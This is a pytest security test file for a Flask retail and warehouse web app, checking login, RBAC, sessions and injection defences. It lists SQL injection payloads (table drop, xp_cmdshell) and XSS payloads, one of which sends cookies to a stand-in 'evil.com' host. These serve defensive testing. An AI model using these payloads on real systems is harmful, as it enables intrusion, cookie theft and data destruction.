"""
Comprehensive Security Tests for Authentication and Authorization
Tests all authentication flows, RBAC permissions, session management,
and attack vector prevention in the SOC_WEB_APP system.
"""

import pytest
import time
import hashlib
import secrets
from datetime import datetime, timedelta
from flask import session, g
from unittest.mock import patch, MagicMock

from app import create_app
from app.models import (
    db, User, Role, Permission, Location, ActivityLog,
    user_roles, role_permissions
)
from app.utils.permissions import (
    permission_required, role_required, admin_required,
    any_permission_required, all_permissions_required,
    Permissions, get_all_permissions, get_default_roles
)


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def security_app():
    """Create application with security-focused configuration."""
    app = create_app('testing')
    app.config.update({
        'WTF_CSRF_ENABLED': False,
        'SERVER_NAME': 'localhost',
        'TESTING': True,
        'SQLALCHEMY_DATABASE_URI': 'sqlite:///:memory:',
        'SECRET_KEY': 'test-secret-key-for-security-testing',
        'SESSION_COOKIE_SECURE': False,  # Allow testing without HTTPS
        'SESSION_COOKIE_HTTPONLY': True,
        'SESSION_COOKIE_SAMESITE': 'Lax',
        'PERMANENT_SESSION_LIFETIME': timedelta(hours=1),
    })

    with app.app_context():
        db.create_all()
        yield app
        db.session.remove()
        db.drop_all()


@pytest.fixture
def security_client(security_app):
    """Create test client for security tests."""
    return security_app.test_client()


@pytest.fixture
def setup_rbac(security_app):
    """Initialize RBAC system with roles and permissions."""
    with security_app.app_context():
        # Create all permissions
        all_perms = get_all_permissions()
        for perm_name, display_name, module in all_perms:
            perm = Permission(
                name=perm_name,
                display_name=display_name,
                module=module
            )
            db.session.add(perm)
        db.session.commit()

        # Create roles
        roles_data = get_default_roles()
        for role_name, role_info in roles_data.items():
            role = Role(
                name=role_name,
                display_name=role_info['display_name'],
                description=role_info['description'],
                is_system=role_info['is_system']
            )
            # Assign permissions to role
            for perm_name in role_info['permissions']:
                perm = Permission.query.filter_by(name=perm_name).first()
                if perm:
                    role.permissions.append(perm)
            db.session.add(role)
        db.session.commit()

        yield


@pytest.fixture
def setup_users(security_app, setup_rbac):
    """Create test users with various roles and states."""
    with security_app.app_context():
        # Create locations first
        warehouse = Location(
            code='WH-TEST',
            name='Test Warehouse',
            location_type='warehouse',
            is_active=True
        )
        db.session.add(warehouse)
        db.session.flush()

        kiosk = Location(
            code='K-TEST',
            name='Test Kiosk',
            location_type='kiosk',
            parent_warehouse_id=warehouse.id,
            is_active=True
        )
        db.session.add(kiosk)

        second_kiosk = Location(
            code='K-TEST2',
            name='Second Kiosk',
            location_type='kiosk',
            parent_warehouse_id=warehouse.id,
            is_active=True
        )
        db.session.add(second_kiosk)
        db.session.flush()

        # Admin user (global admin)
        admin = User(
            username='testadmin',
            email='admin@security.test',
            full_name='Test Admin',
            role='admin',
            is_active=True,
            is_global_admin=True
        )
        admin.set_password('Admin@123!')
        db.session.add(admin)

        # Manager user (location-specific)
        manager = User(
            username='testmanager',
            email='manager@security.test',
            full_name='Test Manager',
            role='manager',
            location_id=kiosk.id,
            is_active=True
        )
        manager.set_password('Manager@123!')
        db.session.add(manager)

        # Cashier user (limited permissions)
        cashier = User(
            username='testcashier',
            email='cashier@security.test',
            full_name='Test Cashier',
            role='cashier',
            location_id=kiosk.id,
            is_active=True
        )
        cashier.set_password('Cashier@123!')
        db.session.add(cashier)

        # Warehouse manager
        wh_manager = User(
            username='testwhmanager',
            email='whmanager@security.test',
            full_name='Test Warehouse Manager',
            role='warehouse_manager',
            location_id=warehouse.id,
            is_active=True
        )
        wh_manager.set_password('Warehouse@123!')
        db.session.add(wh_manager)

        # Inactive user
        inactive = User(
            username='inactiveuser',
            email='inactive@security.test',
            full_name='Inactive User',
            role='cashier',
            is_active=False
        )
        inactive.set_password('Inactive@123!')
        db.session.add(inactive)

        # User with special characters in name
        special_user = User(
            username='special_user',
            email='special@security.test',
            full_name="O'Brien <script>alert('XSS')</script>",
            role='cashier',
            location_id=kiosk.id,
            is_active=True
        )
        special_user.set_password('Special@123!')
        db.session.add(special_user)

        # Second location user (for cross-location tests)
        second_location_user = User(
            username='otherlocation',
            email='other@security.test',
            full_name='Other Location User',
            role='manager',
            location_id=second_kiosk.id,
            is_active=True
        )
        second_location_user.set_password('Other@123!')
        db.session.add(second_location_user)

        # Assign RBAC roles
        admin_role = Role.query.filter_by(name='admin').first()
        manager_role = Role.query.filter_by(name='manager').first()
        cashier_role = Role.query.filter_by(name='cashier').first()
        wh_role = Role.query.filter_by(name='warehouse_manager').first()

        if admin_role:
            admin.roles.append(admin_role)
        if manager_role:
            manager.roles.append(manager_role)
            second_location_user.roles.append(manager_role)
        if cashier_role:
            cashier.roles.append(cashier_role)
            special_user.roles.append(cashier_role)
        if wh_role:
            wh_manager.roles.append(wh_role)

        db.session.commit()
        yield


# ============================================================================
# 1. LOGIN TESTS
# ============================================================================

class TestLogin:
    """Test login functionality and security measures."""

    def test_login_page_accessible(self, security_client, setup_users):
        """Test that login page is accessible to unauthenticated users."""
        response = security_client.get('/auth/login')
        assert response.status_code == 200
        assert b'login' in response.data.lower() or b'Login' in response.data

    def test_valid_login_admin(self, security_client, setup_users):
        """Test successful admin login."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)
        assert response.status_code == 200
        # Admin should be redirected to dashboard (index)
        assert b'Welcome' in response.data or response.status_code == 200

    def test_valid_login_manager(self, security_client, setup_users):
        """Test successful manager login."""
        response = security_client.post('/auth/login', data={
            'username': 'testmanager',
            'password': 'Manager@123!'
        }, follow_redirects=True)
        assert response.status_code == 200

    def test_valid_login_cashier(self, security_client, setup_users):
        """Test successful cashier login."""
        response = security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)
        assert response.status_code == 200

    def test_invalid_username(self, security_client, setup_users):
        """Test login with non-existent username."""
        response = security_client.post('/auth/login', data={
            'username': 'nonexistent',
            'password': 'password123'
        }, follow_redirects=True)
        assert b'Invalid' in response.data or b'invalid' in response.data

    def test_invalid_password(self, security_client, setup_users):
        """Test login with wrong password."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'wrongpassword'
        }, follow_redirects=True)
        assert b'Invalid' in response.data or b'invalid' in response.data

    def test_empty_username(self, security_client, setup_users):
        """Test login with empty username."""
        response = security_client.post('/auth/login', data={
            'username': '',
            'password': 'Admin@123!'
        }, follow_redirects=True)
        assert b'Invalid' in response.data or response.status_code == 200

    def test_empty_password(self, security_client, setup_users):
        """Test login with empty password."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': ''
        }, follow_redirects=True)
        assert b'Invalid' in response.data or response.status_code == 200

    def test_inactive_account_login(self, security_client, setup_users):
        """Test that inactive/deactivated accounts cannot login."""
        response = security_client.post('/auth/login', data={
            'username': 'inactiveuser',
            'password': 'Inactive@123!'
        }, follow_redirects=True)
        assert b'deactivated' in response.data.lower() or b'inactive' in response.data.lower()

    def test_case_sensitive_username(self, security_client, setup_users):
        """Test that username is case-sensitive."""
        response = security_client.post('/auth/login', data={
            'username': 'TESTADMIN',  # Wrong case
            'password': 'Admin@123!'
        }, follow_redirects=True)
        # Should fail because username should be case-sensitive
        assert b'Invalid' in response.data or b'login' in response.data.lower()

    def test_login_updates_last_login(self, security_app, security_client, setup_users):
        """Test that successful login updates last_login timestamp."""
        with security_app.app_context():
            user = User.query.filter_by(username='testadmin').first()
            old_last_login = user.last_login

            security_client.post('/auth/login', data={
                'username': 'testadmin',
                'password': 'Admin@123!'
            }, follow_redirects=True)

            db.session.refresh(user)
            assert user.last_login is not None
            if old_last_login:
                assert user.last_login > old_last_login

    def test_login_creates_activity_log(self, security_app, security_client, setup_users):
        """Test that login creates an activity log entry."""
        with security_app.app_context():
            initial_count = ActivityLog.query.filter_by(action='login').count()

            security_client.post('/auth/login', data={
                'username': 'testadmin',
                'password': 'Admin@123!'
            }, follow_redirects=True)

            new_count = ActivityLog.query.filter_by(action='login').count()
            assert new_count > initial_count

    def test_failed_login_creates_activity_log(self, security_app, security_client, setup_users):
        """Test that failed login attempts are logged."""
        with security_app.app_context():
            initial_count = ActivityLog.query.filter_by(action='failed_login').count()

            security_client.post('/auth/login', data={
                'username': 'testadmin',
                'password': 'wrongpassword'
            }, follow_redirects=True)

            new_count = ActivityLog.query.filter_by(action='failed_login').count()
            assert new_count > initial_count

    def test_redirect_after_login_admin(self, security_client, setup_users):
        """Test admin is redirected to index after login."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=False)
        # Should redirect to index (/) for admin
        assert response.status_code in [302, 303]

    def test_redirect_after_login_cashier(self, security_client, setup_users):
        """Test cashier is redirected to POS after login."""
        response = security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=False)
        # Should redirect to POS for cashier
        assert response.status_code in [302, 303]
        assert '/pos' in response.location or '/' in response.location

    def test_already_authenticated_redirect(self, security_client, setup_users):
        """Test that already logged-in users are redirected from login page."""
        # Login first
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Try to access login page again
        response = security_client.get('/auth/login', follow_redirects=False)
        assert response.status_code == 302  # Should redirect

    def test_next_url_parameter(self, security_client, setup_users):
        """Test that login respects the 'next' URL parameter."""
        response = security_client.post('/auth/login?next=/inventory/', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=False)
        assert response.status_code == 302
        assert '/inventory' in response.location or '/' in response.location

    def test_remember_me_functionality(self, security_client, setup_users):
        """Test remember me checkbox functionality."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!',
            'remember': 'on'
        }, follow_redirects=True)
        assert response.status_code == 200


# ============================================================================
# 2. SQL INJECTION TESTS
# ============================================================================

class TestSQLInjection:
    """Test SQL injection prevention in authentication."""

    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "') OR ('1'='1",
        "' UNION SELECT * FROM users --",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "1' OR '1' = '1",
        "' OR 'x'='x",
        "') OR ('x'='x",
        "admin' OR '1'='1",
        "' OR username LIKE '%",
        "'; EXEC xp_cmdshell('dir'); --",
    ]

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_username(self, security_client, setup_users, payload):
        """Test SQL injection in username field is prevented."""
        response = security_client.post('/auth/login', data={
            'username': payload,
            'password': 'password'
        }, follow_redirects=True)
        # Should not allow login with injection
        assert b'Invalid' in response.data or b'login' in response.data.lower()

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_password(self, security_client, setup_users, payload):
        """Test SQL injection in password field is prevented."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': payload
        }, follow_redirects=True)
        # Should not allow login with injection
        assert b'Invalid' in response.data or b'login' in response.data.lower()

    def test_sql_injection_does_not_expose_data(self, security_app, security_client, setup_users):
        """Test that SQL injection attempts don't expose database info."""
        response = security_client.post('/auth/login', data={
            'username': "' UNION SELECT password_hash FROM users WHERE username='testadmin' --",
            'password': 'test'
        }, follow_redirects=True)
        # Should not contain password hash or database error
        assert b'password_hash' not in response.data
        assert b'SQL' not in response.data
        assert b'syntax' not in response.data.lower()


# ============================================================================
# 3. XSS PREVENTION TESTS
# ============================================================================

class TestXSSPrevention:
    """Test XSS attack prevention in authentication forms."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>document.location='http://evil.com/'+document.cookie</script>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<div onmouseover=\"alert('XSS')\">hover</div>",
        "';alert('XSS');//",
        "\"><script>alert('XSS')</script>",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_username_escaped(self, security_client, setup_users, payload):
        """Test that XSS payloads in username are escaped in response."""
        response = security_client.post('/auth/login', data={
            'username': payload,
            'password': 'password'
        }, follow_redirects=True)
        # Raw script tags should not appear in response
        assert b'<script>' not in response.data
        assert b'onerror=' not in response.data
        assert b'onload=' not in response.data

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_flash_messages_escaped(self, security_client, setup_users, payload):
        """Test that XSS in flash messages is properly escaped."""
        response = security_client.post('/auth/login', data={
            'username': payload,
            'password': 'password'
        }, follow_redirects=True)
        # Ensure script tags are escaped
        assert b'<script>' not in response.data

    def test_special_char_username_display(self, security_app, security_client, setup_users):
        """Test that special characters in usernames are properly displayed."""
        # Login with user that has special characters in full_name
        security_client.post('/auth/login', data={
            'username': 'special_user',
            'password': 'Special@123!'
        }, follow_redirects=True)

        # Access a page that displays user info
        response = security_client.get('/', follow_redirects=True)
        # The XSS payload in full_name should be escaped
        assert b"<script>alert('XSS')</script>" not in response.data


# ============================================================================
# 4. LOGOUT TESTS
# ============================================================================

class TestLogout:
    """Test logout functionality and session destruction."""

    def test_logout_redirects_to_login(self, security_client, setup_users):
        """Test that logout redirects to login page."""
        # Login first
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Logout
        response = security_client.get('/auth/logout', follow_redirects=False)
        assert response.status_code == 302
        assert '/login' in response.location

    def test_logout_clears_session(self, security_client, setup_users):
        """Test that logout properly clears user session."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Logout
        security_client.get('/auth/logout', follow_redirects=True)

        # Try to access protected page
        response = security_client.get('/inventory/', follow_redirects=False)
        assert response.status_code == 302  # Should redirect to login

    def test_logout_creates_activity_log(self, security_app, security_client, setup_users):
        """Test that logout creates activity log entry."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        with security_app.app_context():
            initial_count = ActivityLog.query.filter_by(action='logout').count()

        # Logout
        security_client.get('/auth/logout', follow_redirects=True)

        with security_app.app_context():
            new_count = ActivityLog.query.filter_by(action='logout').count()
            assert new_count > initial_count

    def test_logout_requires_login(self, security_client, setup_users):
        """Test that logout requires being logged in."""
        response = security_client.get('/auth/logout', follow_redirects=False)
        # Should redirect to login or return unauthorized
        assert response.status_code in [302, 401]

    def test_multiple_logout_attempts(self, security_client, setup_users):
        """Test that multiple logout attempts don't cause errors."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # First logout
        security_client.get('/auth/logout', follow_redirects=True)

        # Second logout attempt (should not crash)
        response = security_client.get('/auth/logout', follow_redirects=True)
        assert response.status_code == 200  # Should gracefully handle

    def test_session_cookie_cleared_on_logout(self, security_client, setup_users):
        """Test that session cookie is invalidated on logout."""
        # Login and get session
        login_response = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Logout
        logout_response = security_client.get('/auth/logout', follow_redirects=True)

        # Verify cannot access protected resources
        protected_response = security_client.get('/inventory/', follow_redirects=False)
        assert protected_response.status_code == 302


# ============================================================================
# 5. PASSWORD CHANGE TESTS
# ============================================================================

class TestPasswordChange:
    """Test password change functionality."""

    def test_password_change_page_requires_login(self, security_client, setup_users):
        """Test that password change page requires authentication."""
        response = security_client.get('/auth/change-password', follow_redirects=False)
        assert response.status_code == 302

    def test_password_change_with_correct_current(self, security_client, setup_users):
        """Test successful password change with correct current password."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Change password
        response = security_client.post('/auth/change-password', data={
            'current_password': 'Cashier@123!',
            'new_password': 'NewPassword@456!',
            'confirm_password': 'NewPassword@456!'
        }, follow_redirects=True)

        assert b'success' in response.data.lower() or b'changed' in response.data.lower()

    def test_password_change_wrong_current(self, security_client, setup_users):
        """Test password change fails with wrong current password."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Try to change with wrong current password
        response = security_client.post('/auth/change-password', data={
            'current_password': 'WrongPassword!',
            'new_password': 'NewPassword@456!',
            'confirm_password': 'NewPassword@456!'
        }, follow_redirects=True)

        assert b'incorrect' in response.data.lower() or b'error' in response.data.lower() or b'danger' in response.data.lower()

    def test_password_change_mismatch(self, security_client, setup_users):
        """Test password change fails when new passwords don't match."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Try to change with mismatched passwords
        response = security_client.post('/auth/change-password', data={
            'current_password': 'Cashier@123!',
            'new_password': 'NewPassword@456!',
            'confirm_password': 'DifferentPassword@789!'
        }, follow_redirects=True)

        assert b'match' in response.data.lower() or b'error' in response.data.lower()

    def test_password_change_too_short(self, security_client, setup_users):
        """Test password change fails if new password is too short."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Try to change with short password
        response = security_client.post('/auth/change-password', data={
            'current_password': 'Cashier@123!',
            'new_password': '12345',  # Too short (< 6 chars)
            'confirm_password': '12345'
        }, follow_redirects=True)

        assert b'6 characters' in response.data or b'error' in response.data.lower()

    def test_password_change_creates_activity_log(self, security_app, security_client, setup_users):
        """Test that password change creates activity log."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        with security_app.app_context():
            initial_count = ActivityLog.query.filter_by(action='password_change').count()

        # Change password
        security_client.post('/auth/change-password', data={
            'current_password': 'Cashier@123!',
            'new_password': 'NewPassword@456!',
            'confirm_password': 'NewPassword@456!'
        }, follow_redirects=True)

        with security_app.app_context():
            new_count = ActivityLog.query.filter_by(action='password_change').count()
            assert new_count > initial_count

    def test_login_with_new_password(self, security_app, security_client, setup_users):
        """Test that user can login with new password after change."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Change password
        security_client.post('/auth/change-password', data={
            'current_password': 'Cashier@123!',
            'new_password': 'NewPassword@456!',
            'confirm_password': 'NewPassword@456!'
        }, follow_redirects=True)

        # Logout
        security_client.get('/auth/logout', follow_redirects=True)

        # Login with new password
        response = security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'NewPassword@456!'
        }, follow_redirects=True)

        assert response.status_code == 200

    def test_old_password_no_longer_works(self, security_app, security_client, setup_users):
        """Test that old password doesn't work after change."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Change password
        security_client.post('/auth/change-password', data={
            'current_password': 'Cashier@123!',
            'new_password': 'NewPassword@456!',
            'confirm_password': 'NewPassword@456!'
        }, follow_redirects=True)

        # Logout
        security_client.get('/auth/logout', follow_redirects=True)

        # Try to login with old password
        response = security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'  # Old password
        }, follow_redirects=True)

        assert b'Invalid' in response.data or b'invalid' in response.data


# ============================================================================
# 6. RBAC PERMISSION TESTS
# ============================================================================

class TestRBACPermissions:
    """Test Role-Based Access Control permissions."""

    def test_admin_has_all_permissions(self, security_app, setup_users):
        """Test that admin role has all permissions."""
        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            all_perms = get_all_permissions()

            for perm_name, _, _ in all_perms:
                assert admin.has_permission(perm_name), f"Admin missing permission: {perm_name}"

    def test_cashier_limited_permissions(self, security_app, setup_users):
        """Test that cashier has limited permissions."""
        with security_app.app_context():
            cashier = User.query.filter_by(username='testcashier').first()

            # Should have POS permissions
            assert cashier.has_permission('pos.view')
            assert cashier.has_permission('pos.create_sale')

            # Should NOT have admin permissions
            assert not cashier.has_permission('settings.manage_users')
            assert not cashier.has_permission('settings.manage_roles')
            assert not cashier.has_permission('inventory.delete')

    def test_manager_permissions(self, security_app, setup_users):
        """Test manager role permissions."""
        with security_app.app_context():
            manager = User.query.filter_by(username='testmanager').first()

            # Should have manager-level permissions
            assert manager.has_permission('pos.view')
            assert manager.has_permission('pos.create_sale')
            assert manager.has_permission('customer.edit')

            # Should NOT have admin-level permissions
            assert not manager.has_permission('settings.manage_roles')

    def test_warehouse_manager_permissions(self, security_app, setup_users):
        """Test warehouse manager permissions."""
        with security_app.app_context():
            wh_manager = User.query.filter_by(username='testwhmanager').first()

            # Should have warehouse permissions
            assert wh_manager.has_permission('warehouse.view')
            assert wh_manager.has_permission('warehouse.manage_stock')
            assert wh_manager.has_permission('transfer.approve')

            # Should NOT have POS sales permissions
            assert not wh_manager.has_permission('pos.create_sale')

    def test_global_admin_has_all_permissions(self, security_app, setup_users):
        """Test that global admin flag grants all permissions."""
        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            assert admin.is_global_admin

            # Global admin should have ANY permission
            assert admin.has_permission('any.random.permission')  # Non-existent perm

    def test_permission_inheritance_from_role(self, security_app, setup_users):
        """Test that permissions are properly inherited from roles."""
        with security_app.app_context():
            cashier = User.query.filter_by(username='testcashier').first()
            cashier_role = Role.query.filter_by(name='cashier').first()

            # Get permissions from role
            role_perms = [p.name for p in cashier_role.permissions]

            # User should have all permissions from their role
            for perm_name in role_perms:
                assert cashier.has_permission(perm_name)

    def test_has_role_method(self, security_app, setup_users):
        """Test the has_role method."""
        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            cashier = User.query.filter_by(username='testcashier').first()

            assert admin.has_role('admin')
            assert not admin.has_role('cashier')

            assert cashier.has_role('cashier')
            assert not cashier.has_role('admin')

    def test_get_all_permissions_method(self, security_app, setup_users):
        """Test getting all permissions for a user."""
        with security_app.app_context():
            cashier = User.query.filter_by(username='testcashier').first()

            permissions = cashier.get_all_permissions()
            assert isinstance(permissions, list)
            assert 'pos.view' in permissions


# ============================================================================
# 7. PERMISSION DECORATOR TESTS
# ============================================================================

class TestPermissionDecorators:
    """Test permission decorator functionality."""

    def test_permission_required_allows_authorized(self, security_client, setup_users):
        """Test that permission_required allows users with permission."""
        # Login as admin (has all permissions)
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Access inventory (requires inventory.view)
        response = security_client.get('/inventory/', follow_redirects=True)
        assert response.status_code == 200

    def test_permission_required_blocks_unauthorized(self, security_client, setup_users):
        """Test that permission_required blocks users without permission."""
        # Login as cashier
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Try to access settings (requires settings.view)
        response = security_client.get('/settings/', follow_redirects=True)
        # Should be forbidden or redirected
        assert response.status_code in [200, 403] and (
            b'permission' in response.data.lower() or
            b'403' in response.data or
            b'forbidden' in response.data.lower() or
            response.status_code == 403
        )

    def test_permission_required_redirects_unauthenticated(self, security_client, setup_users):
        """Test that permission_required redirects unauthenticated users."""
        response = security_client.get('/inventory/', follow_redirects=False)
        assert response.status_code == 302
        assert '/login' in response.location

    def test_admin_required_allows_admin(self, security_client, setup_users):
        """Test that admin_required allows admin users."""
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Access feature flags (requires admin)
        response = security_client.get('/features/', follow_redirects=True)
        assert response.status_code == 200

    def test_admin_required_blocks_non_admin(self, security_client, setup_users):
        """Test that admin_required blocks non-admin users."""
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        # Try to access feature flags
        response = security_client.get('/features/', follow_redirects=True)
        assert response.status_code in [200, 403] and (
            b'administrator' in response.data.lower() or
            b'403' in response.data or
            b'forbidden' in response.data.lower() or
            response.status_code == 403
        )

    def test_role_required_allows_correct_role(self, security_app, setup_users):
        """Test that role_required allows users with correct role."""
        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            assert admin.has_role('admin')

    def test_json_api_returns_json_error(self, security_client, setup_users):
        """Test that API endpoints return JSON errors for unauthorized access."""
        # Try to access API endpoint without auth
        response = security_client.get(
            '/inventory/',
            headers={'Accept': 'application/json'},
            follow_redirects=True
        )
        # Should either redirect or return JSON error
        assert response.status_code in [200, 302, 401]


# ============================================================================
# 8. SESSION MANAGEMENT TESTS
# ============================================================================

class TestSessionManagement:
    """Test session security measures."""

    def test_session_created_on_login(self, security_client, setup_users):
        """Test that session is created on successful login."""
        with security_client.session_transaction() as sess:
            assert '_user_id' not in sess

        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        with security_client.session_transaction() as sess:
            assert '_user_id' in sess or 'user_id' in sess or len(sess) > 0

    def test_session_destroyed_on_logout(self, security_client, setup_users):
        """Test that session is destroyed on logout."""
        # Login
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Logout
        security_client.get('/auth/logout', follow_redirects=True)

        # Check session is cleared
        response = security_client.get('/inventory/', follow_redirects=False)
        assert response.status_code == 302

    def test_location_id_stored_in_session(self, security_client, setup_users):
        """Test that user's location ID is stored in session."""
        security_client.post('/auth/login', data={
            'username': 'testmanager',  # Has location
            'password': 'Manager@123!'
        }, follow_redirects=True)

        with security_client.session_transaction() as sess:
            assert 'current_location_id' in sess

    def test_global_admin_no_specific_location(self, security_client, setup_users):
        """Test that global admin can access without specific location."""
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Should still be able to access resources
        response = security_client.get('/inventory/', follow_redirects=True)
        assert response.status_code == 200

    def test_session_regeneration_on_login(self, security_client, setup_users):
        """Test that session ID is regenerated on login (session fixation prevention)."""
        # Get initial session
        response1 = security_client.get('/auth/login')

        # Login
        response2 = security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Session should be different after login
        assert response2.status_code == 200


# ============================================================================
# 9. LOCATION-BASED ACCESS TESTS
# ============================================================================

class TestLocationAccess:
    """Test location-based access control."""

    def test_user_can_access_own_location(self, security_app, setup_users):
        """Test that user can access their assigned location."""
        with security_app.app_context():
            manager = User.query.filter_by(username='testmanager').first()
            assert manager.can_access_location(manager.location_id)

    def test_user_cannot_access_other_location(self, security_app, setup_users):
        """Test that user cannot access other locations."""
        with security_app.app_context():
            manager = User.query.filter_by(username='testmanager').first()
            other_user = User.query.filter_by(username='otherlocation').first()

            # Manager should not be able to access other manager's location
            assert not manager.can_access_location(other_user.location_id)

    def test_global_admin_can_access_all_locations(self, security_app, setup_users):
        """Test that global admin can access all locations."""
        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            locations = Location.query.all()

            for location in locations:
                assert admin.can_access_location(location.id)

    def test_get_accessible_locations_user(self, security_app, setup_users):
        """Test getting accessible locations for regular user."""
        with security_app.app_context():
            manager = User.query.filter_by(username='testmanager').first()
            accessible = manager.get_accessible_locations()

            assert len(accessible) == 1
            assert accessible[0].id == manager.location_id

    def test_get_accessible_locations_global_admin(self, security_app, setup_users):
        """Test getting accessible locations for global admin."""
        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            accessible = admin.get_accessible_locations()

            all_locations = Location.query.filter_by(is_active=True).all()
            assert len(accessible) == len(all_locations)


# ============================================================================
# 10. EDGE CASES AND SPECIAL CHARACTERS
# ============================================================================

class TestEdgeCases:
    """Test edge cases and special character handling."""

    def test_unicode_password(self, security_app, setup_users):
        """Test that unicode characters in passwords work."""
        with security_app.app_context():
            user = User.query.filter_by(username='testcashier').first()
            unicode_password = 'Password\u4e2d\u6587@123!'
            user.set_password(unicode_password)
            db.session.commit()

            assert user.check_password(unicode_password)
            assert not user.check_password('wrongpassword')

    def test_special_characters_in_password(self, security_app, setup_users):
        """Test passwords with special characters."""
        with security_app.app_context():
            user = User.query.filter_by(username='testcashier').first()
            special_password = '!@#$%^&*()_+-=[]{}|;:,.<>?'
            user.set_password(special_password)
            db.session.commit()

            assert user.check_password(special_password)

    def test_very_long_password(self, security_app, setup_users):
        """Test handling of very long passwords."""
        with security_app.app_context():
            user = User.query.filter_by(username='testcashier').first()
            long_password = 'A' * 1000 + '@123!'
            user.set_password(long_password)
            db.session.commit()

            assert user.check_password(long_password)

    def test_empty_password_hash(self, security_app, setup_users):
        """Test that empty passwords are handled securely."""
        with security_app.app_context():
            user = User.query.filter_by(username='testcashier').first()

            # Empty string password should still be hashed
            user.set_password('')
            db.session.commit()

            # But verification should work
            assert user.check_password('')
            assert not user.check_password('something')

    def test_whitespace_password(self, security_app, setup_users):
        """Test passwords that are only whitespace."""
        with security_app.app_context():
            user = User.query.filter_by(username='testcashier').first()
            whitespace_password = '      '
            user.set_password(whitespace_password)
            db.session.commit()

            assert user.check_password(whitespace_password)
            assert not user.check_password('')  # Different from empty

    def test_null_bytes_in_input(self, security_client, setup_users):
        """Test handling of null bytes in login input."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin\x00',
            'password': 'Admin@123!'
        }, follow_redirects=True)
        # Should handle gracefully without crashing
        assert response.status_code in [200, 400, 302]

    def test_newlines_in_input(self, security_client, setup_users):
        """Test handling of newlines in login input."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin\nadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)
